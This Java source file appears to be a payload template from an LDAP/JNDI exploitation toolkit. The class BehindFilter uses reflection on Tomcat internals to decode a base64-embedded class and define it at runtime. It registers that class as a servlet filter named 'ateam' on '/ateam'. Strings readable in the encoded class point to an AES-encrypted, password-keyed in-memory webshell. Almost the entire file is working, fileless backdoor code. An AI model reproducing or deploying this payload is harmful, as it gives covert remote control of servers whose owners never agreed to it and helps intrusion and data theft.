package com.feihong.ldap.template;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
//import org.apache.tomcat.util.descriptor.web.FilterDef;
//import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

/**
 * @ClassName: BehindFilter
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/8/9 10:29
 * @Version: v1.0.0
 * @Description:
 **/
public class BehindFilter extends ClassLoader{
    public BehindFilter()  {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
        Class standardConteClass = null;

        try {
            standardConteClass = Class.forName("org.apache.catalina.core.StandardContext");
        } catch (ClassNotFoundException var24) {
            var24.printStackTrace();
        }

        Field filterconfigs = null;

        try {
            filterconfigs = standardConteClass.getDeclaredField("filterConfigs");
        } catch (NoSuchFieldException var23) {
            var23.printStackTrace();
        }

        filterconfigs.setAccessible(true);
        String base64class = "yv66vgAAADQB3AoAegD7CQBpAPwJAGkA/QgA/gkAaQD/CAEACQBpAQEIAQIJAGkBAwoAegEECgB6AQUIAQYKAQcBCAoATwEJCgBPAQoKAQcBCwcBDAoBBwENCgARAQ4KABEBDwoATwEQBwERCgBpARIIARMLADQBFAoAaQEVCACDBwEWCgAcAPsIARcIARgIARkLADUBGgsANAEbCwA1ARsKAGkBHAoAHAEdBwEeCgAmAPsIAR8KACYBIAoAFgEhCgAmASELADUBIgoAHAEhCgEjASQKASMBJQoBIwEmCgA7AScKADkBKAcArAcBKQcBKggBKwoAOQEsCAEtBwEuCgA5AS8HATAKATEBMggBMwgAfAoAOQE0CgE1ATYKATUBNwgAfgsANAE4CwE5AToIATsHATwHAT0HAT4IAT8JAUABQQoBNQFCCwE5AUMJAUQBRQoBRgFHBwFICwDKAUkIAUoKADkBSwoBMQE2CQFAAUwIAU0IAU4IAL4IAU8KAE8BUAgBUQoAFgFSCAFTCwA0AVQHAVUKAF4A+wsBVgFXCADlCAFYCwFZAVoIAVsKAVwBXQcBXgoAZgFfCgFcAWAHAWEKADkBYgoAaQEECwFjAWQKAWUBZgoAaQFnCgFcAWgKAGkBaQoAOQFqCgA7AWsKABYBbAgBbQgBbgcAkggBbwgBcAgBcQcBcgcBcwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJjcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExCZWhpbmRlckZpbHRlcjsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQABYgEAAltCAQADbWQ1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBYQcBSAcBEQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABHZhcjcBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAZvdXRwdXQBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAV0YWdfcwEABXRhZ19lBwEwBwEWAQAIcGFyc2VPYmoBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAARkYXRhAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAANyZXEBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAIcmVxdWVzdDIBAARyZXNwAQAEdmFyOAEACWFkZEZpbHRlcgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZmlsdGVyTWFwAQAFdmFyMjEBAAxmaWx0ZXJNYXBPYmoBAARuYW1lAQABaQEAAUkBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQAFdmFyMjUBAAV2YXIxMQEABXZhcjIyAQAMY29udGV4dEZpZWxkAQASYXBwbGljYXRpb25Db250ZXh0AQAtTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQ7AQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAKc3RhdGVGaWVsZAEAEmZpbHRlclJlZ2lzdHJhdGlvbgcBdQEAB0R5bmFtaWMBAAxJbm5lckNsYXNzZXMBACpMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBAA5zZXJ2bGV0Q29udGV4dAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEABmZpbHRlcgEAFkxqYXZheC9zZXJ2bGV0L0ZpbHRlcjsBAApmaWx0ZXJOYW1lAQADdXJsBwF2BwFzBwF3BwE8BwE9BwF1BwF4BwEuBwF5AQAKRXhjZXB0aW9ucwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAD0xqYXZhL3V0aWwvTWFwOwcBegcBewcBfAcBfQcBfgcBfwcBgAEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAEdmFyNQEAA3N0cgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQATQmVoaW5kZXJGaWx0ZXIuamF2YQwAhACFDAB8AH0MAH4AfwEABVVURi04DACAAIEBABBlYWM5ZmEzODMzMGE3NTM1DACCAIEBABAvZmF2aWNvbmRlbW8uaWNvDACDAIEMAIQAiwwBgQGCAQADTUQ1BwGDDAGEAYUMAYYBhwwBiAGJDAGKAYsBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBjAGHDACEAY0MAY4BjwwBkAGRAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAqQCqAQABcAwBkgCUDACTAJQBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQADLT58AQADfDwtAQAJdGV4dC9odG1sDAGTAZQMAZUBlAwAtAC1DAGWAZcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBlgGYDAGOALUMAZkBmgcBmwwBnAGUDAGdAIUMAZ4AhQwBnwGgDAGhAaIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAwBowGkAQAKZ2V0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwBpQGmAQAQamF2YS9sYW5nL09iamVjdAcBeAwBpwGoAQALZ2V0UmVzcG9uc2UMAakBqgcBdwwBqwGsDAGtAa4MAa8BsAcBdgwBsQGyAQAHY29udGV4dAEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0AQAmb3JnL2FwYWNoZS9jYXRhbGluYS91dGlsL0xpZmVjeWNsZUJhc2UBAAVzdGF0ZQcBswwBtAG1DAG2AbcMALQBuAcBuQwBugG7BwG8DAG9Ab4BABBqYXZhL2xhbmcvU3RyaW5nDAG/AcABAAtmaWx0ZXJTdGFydAwBwQGmDAHCAbUBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAEADWdldEZpbHRlck5hbWUMAcMBxAEAB1N1Y2Nlc3MMAcUAtQEAFUZpbHRlciBhbHJlYWR5IGV4aXN0cwwBxgHHAQARamF2YS91dGlsL0hhc2hNYXAHAX4MAcgByQEAAXUHAX0MAcoBywEAA0FFUwcBzAwBhAHNAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAhAHODAD0Ac8BAA5CZWhpbmRlckZpbHRlcgwB0AHRBwF6DAHSAdMHAdQMAdUAtQwA7wDwDAHWAdcMAI8AkAwB2AHZDACdAJ4MAdoAhQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyBwHbAQAoamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYwEAHGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAE2phdmEvbGFuZy9UaHJvd2FibGUBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQANamF2YS91dGlsL01hcAEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEACHRvU3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldEhlYWRlcgEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQAFZmx1c2gBAAVjbG9zZQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAB2lzQXJyYXkBAAMoKVoBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEAFWdldEZpbHRlclJlZ2lzdHJhdGlvbgEANihMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uOwEAIm9yZy9hcGFjaGUvY2F0YWxpbmEvTGlmZWN5Y2xlU3RhdGUBAA1TVEFSVElOR19QUkVQAQAkTG9yZy9hcGFjaGUvY2F0YWxpbmEvTGlmZWN5Y2xlU3RhdGU7AQADc2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQBUKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZheC9zZXJ2bGV0L0ZpbHRlcjspTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWM7AQAcamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZQEAB1JFUVVFU1QBAB5MamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsBABFqYXZhL3V0aWwvRW51bVNldAEAAm9mAQAlKExqYXZhL2xhbmcvRW51bTspTGphdmEvdXRpbC9FbnVtU2V0OwEAGGFkZE1hcHBpbmdGb3JVcmxQYXR0ZXJucwEAKihMamF2YS91dGlsL0VudW1TZXQ7WltMamF2YS9sYW5nL1N0cmluZzspVgEACWdldE1ldGhvZAEAB1NUQVJURUQBABBlcXVhbHNJZ25vcmVDYXNlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAKZ2V0TWVzc2FnZQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhwdXRWYWx1ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEAB2RvRmluYWwBAAYoW0IpW0IBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAgamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24AIQBpAHoAAQB7AAUAAQB8AH0AAAABAH4AfwAAAAEAgACBAAAAAQCCAIEAAAABAIMAgQAAAAsAAQCEAIUAAQCGAAAAYwACAAEAAAAhKrcAASoBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAmxAAAAAgCHAAAAHgAHAAAAHAAEABYACQAXAA4AGAAUABkAGgAaACAAHQCIAAAADAABAAAAIQCJAIoAAAABAIQAiwACAIYAAABuAAIAAgAAACIqK7cACioBtQACKgG1AAMqEgS1AAUq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";
        BASE64Decoder base64Decoder = new BASE64Decoder();
        Class ccc = null;

        try {
            byte[] clazz = base64Decoder.decodeBuffer(base64class);
            ccc = super.defineClass(clazz, 0, clazz.length);
        } catch (IOException var22) {
            var22.printStackTrace();
        }

        Filter filter = null;

        try {
            filter = (Filter)ccc.newInstance();
        } catch (InstantiationException var20) {
            var20.printStackTrace();
        } catch (IllegalAccessException var21) {
            var21.printStackTrace();
        }

        Map configs = null;

        try {
            configs = (Map)filterconfigs.get(standardContext);
        } catch (IllegalAccessException var19) {
            var19.printStackTrace();
        }

        //生成 FilterDef
        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
        Class filterDefClass = null;
        try {
            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
        } catch (ClassNotFoundException e) {
            try {
                filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            } catch (ClassNotFoundException classNotFoundException) {
                classNotFoundException.printStackTrace();
            }
        }
        Object filterDef = null;
        try {
            filterDef = filterDefClass.newInstance();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        try {
            filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef,"ateam");
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        try {
            filterDef.getClass().getDeclaredMethod("setFilterClass",String.class).invoke(filterDef, filter.getClass().getName());
            standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext,filterDef);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }

        //设置 FilterMap
        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
        Class filterMapClass = null;
        try {
            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
        } catch (ClassNotFoundException e) {
            try {
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            } catch (ClassNotFoundException classNotFoundException) {
                classNotFoundException.printStackTrace();
            }
        }


        try {
            Object filtermap = filterMapClass.newInstance();
            filtermap.getClass().getDeclaredMethod("setFilterName",String.class).invoke(filtermap,"ateam");
            filtermap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filtermap, DispatcherType.REQUEST.name());
            filtermap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filtermap, "/ateam");
            standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filtermap);



        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }

//        FilterDef filterDef = new FilterDef();
//        filterDef.setFilter(filter);
//        filterDef.setFilterName("filter");
//        filterDef.setFilterClass(filter.getClass().getName());
//        standardContext.addFilterDef(filterDef);
//        FilterMap filterMap = new FilterMap();
//        filterMap.setFilterName("filter");
//        filterMap.setDispatcher(DispatcherType.REQUEST.name());
//        filterMap.addURLPattern("/filtercmd");
//        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = null;

        try {
            constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
        } catch (NoSuchMethodException var18) {
            var18.printStackTrace();
        }

        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = null;

        try {
            applicationFilterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);
        } catch (InstantiationException var15) {
            var15.printStackTrace();
        } catch (IllegalAccessException var16) {
            var16.printStackTrace();
        } catch (InvocationTargetException var17) {
            var17.printStackTrace();
        }

        configs.put("ateam", applicationFilterConfig);
    }
}
